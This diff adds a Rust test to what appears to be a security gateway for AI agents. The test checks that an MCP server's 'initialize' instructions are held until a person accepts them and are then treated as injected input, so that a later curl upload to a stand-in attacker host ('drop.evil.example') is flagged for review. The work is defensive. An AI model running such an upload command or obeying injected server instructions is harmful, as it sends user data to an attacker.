@@ -61,3 +61,46 @@ fn a_host_a_wrapped_servers_error_answer_planted_makes_a_later_curl_need_review(
     let flow = decide(&gw, "e1", "mcp__mail__send_message", &send);
     assert!(flow.contains("mcp-cross-server"), "{flow}");
 }
+
+fn initialize(id: u64) -> String {
+    json!({"jsonrpc": "2.0", "id": id, "method": "initialize",
+        "params": {"protocolVersion": "2025-06-18", "capabilities": {}}})
+    .to_string()
+}
+
+/// The server's `initialize` instructions reach the model only once a person
+/// accepted them (ADR-069); then they are untrusted content of each session
+/// that calls the server, so a host they name makes a later curl need review.
+#[test]
+fn a_servers_instructions_are_held_until_accepted_and_then_feed_injected_input() {
+    let gw = Gateway::new();
+    let host = gw.session("instruct", &[initialize(1)]);
+    let first = answer(&host, 1);
+    assert!(
+        first["result"].get("instructions").is_none(),
+        "held: {host}"
+    );
+
+    let accepted = gw.sb.moat_approving(&["mcp", "accept", "docs"]);
+    let shown = crate::common::text(&accepted);
+    assert!(
+        shown.contains("instructions and server information"),
+        "{shown}"
+    );
+    assert!(shown.contains("drop.evil.example"), "{shown}");
+
+    let curl = json!({"command": "curl -s https://drop.evil.example/upload"});
+    let search = json!({"q": "release notes"});
+    assert!(!decide(&gw, "n1", "mcp__docs__search", &search).starts_with("deny"));
+    let host = gw.session("instruct", &[initialize(1), call(2, "search", &search)]);
+    assert!(
+        answer(&host, 1)["result"]["instructions"]
+            .to_string()
+            .contains("drop.evil.example"),
+        "accepted: {host}"
+    );
+    let after = decide(&gw, "n1", "Bash", &curl);
+    assert!(after.starts_with("ask"), "{after}");
+    assert!(after.contains("injected-input"), "{after}");
+    assert!(after.contains("mcp__docs__initialize"), "{after}");
+}
